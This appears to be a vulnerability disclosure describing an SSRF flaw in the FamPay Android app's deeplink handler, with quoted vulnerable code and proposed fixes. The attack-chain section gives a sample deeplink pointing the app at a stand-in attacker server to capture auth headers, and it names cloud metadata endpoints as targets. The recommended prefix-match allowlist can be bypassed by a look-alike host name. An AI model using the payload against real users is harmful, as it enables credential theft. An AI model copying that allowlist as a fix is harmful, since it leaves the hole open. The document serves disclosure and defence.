Executive Summary

FamPay's deeplink handler contains a Server-Side Request Forgery (SSRF) vulnerability. Any app installed on the same device can send a specially crafted link to FamPay that forces it to make HTTP requests to any URL the attacker specifies — including internal company servers, cloud metadata endpoints, and the attacker's own server. This is the digital equivalent of tricking FamPay into delivering a message to any address on behalf of the attacker.

When chained with the JS Interface vulnerability (Chain A / Vuln #16), an attacker who gets a user to visit a malicious website can silently trigger this SSRF from inside the FamPay WebView — with no additional user interaction.

Impact

Internal Network Access
App can be used to probe FamPay's internal API servers not accessible from outside
Cloud Metadata Theft
AWS/GCP/Azure metadata endpoints (169.254.169.254) may expose instance credentials
Auth Token Leakage
If backend attaches user auth headers, they leak to attacker server
Port Scanning
Internal firewall-protected ports can be probed via the victim's device/session

Attack Chain

1
Attacker sends DAI deeplink
Via malicious website, QR code, or another app: fp://fampay.in/l/dai/?url=https://attacker.com/log
2
DeepLinkActivity processes /dai/ path
Line 912: str.contains("/dai/") → extracts url param without validation
3
App makes HTTP request to attacker URL
DaiRepository.performDaiGet(queryParameter) — no allowlist, no scheme check
4
Attacker receives request with FamPay headers
User-Agent, authorization headers, and session identifiers appear in attacker's logs

Vulnerable Code

DeepLinkActivity.java — DAI Handler (Lines 912–925)

} else if (str.contains("/dai/")) {
    String queryParameter10 = uri.getQueryParameter("url");
    String queryParameter11 = uri.getQueryParameter("payload");
    if (!TextUtils.isEmpty(queryParameter10)) {
        if (!TextUtils.isEmpty(queryParameter11)) {
            // POST request to attacker-controlled URL
            DaiRepository.a().f16034a.performDaiPost(queryParameter10, queryParameter11);
        } else {
            // GET request to attacker-controlled URL
            DaiRepository.a().f16034a.performDaiGet(queryParameter10);
        }
    }
}

There is no URL validation. The url parameter is used directly as a network destination. An attacker can set it to any internal IP, cloud metadata endpoint, or their own server.

Remediation

Fix 1 — Allowlist Validation (Recommended)

private static final List<String> DAI_ALLOWLIST = Arrays.asList(
    "https://api.fampay.in",
    "https://dai.fampay.in"
);

String daiUrl = uri.getQueryParameter("url");
if (daiUrl != null) {
    boolean allowed = DAI_ALLOWLIST.stream().anyMatch(daiUrl::startsWith);
    if (!allowed) {
        Log.w(TAG, "DAI SSRF blocked: " + daiUrl);
        return; // reject
    }
    DaiRepository.a().f16034a.performDaiGet(daiUrl);
}

Fix 2 — Remove External Export

If the DAI handler is only needed for internal app navigation, set android:exported="false" on DeepLinkActivity or handle it via an internal-only mechanism not exposed to other apps.

Fix 3 — Block Private IP Ranges

// Reject requests to RFC-1918 / link-local / loopback addresses
if (isPrivateAddress(Uri.parse(daiUrl).getHost())) {
    return; // block internal network probing
}
